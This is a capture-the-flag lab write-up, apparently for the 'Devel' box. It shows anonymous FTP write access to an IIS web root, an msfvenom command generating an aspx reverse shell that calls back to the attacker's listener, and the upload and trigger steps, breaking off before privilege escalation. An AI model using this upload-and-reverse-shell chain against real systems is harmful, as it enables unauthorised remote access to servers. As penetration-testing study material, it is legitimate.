Hereâ€™s what nmap teaches us :

- port 21 (FTP) - with anonyous login and 2 files / 1 directorie
- port 80 (HTTP) - IIS 7.5

First I go to the website :

![Website IIS](/assets/imgs/devel/website_IIS.PNG)

This is a default IIS7 installation. Looking at the image, I see that it's called "welcome.png", the same name as the one on the FTP, weird. Let's see what I can do with the FTP.

```bash
ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:liodeus): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

To login I used the following credentials "anonymous:Anything" and I have the right to list files/directories, nice, can I write also ?

First I created a html test file :

```bash
echo "<h1>test</h1>" > test.html
```

Then over the ftp I used the command "put <file>" to upload my newly created file.

```bash
ftp> put test.html
local: test.html remote: test.html
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
15 bytes sent in 0.00 secs (36.6211 kB/s)
```

 It seems to work ! Let's go see if I can view it.

![Website IIS](/assets/imgs/devel/test_html.PNG)

I can upload files as I want, nice ! So now let's upload a reverse shell !

## Exploit

------

For a reverse shell I used msfvenom and "aspx" extension because it's IIS.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f aspx > shell.aspx
```

Upload the reverse shell :

```
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2746 bytes sent in 0.00 secs (6.9280 MB/s)
```

Start the nc listener :

```bash
nc -lvp 1234
```

Then go see the page where the shell is upload :

```bash
curl http://10.10.10.5/shell.aspx
```

And I have a connection : 

```bash
nc -lvp 1234
listening on [any] 1234 ...

I'm not "nt authority\system" (root on windows), I have the same rights as the web server, let's escalate !
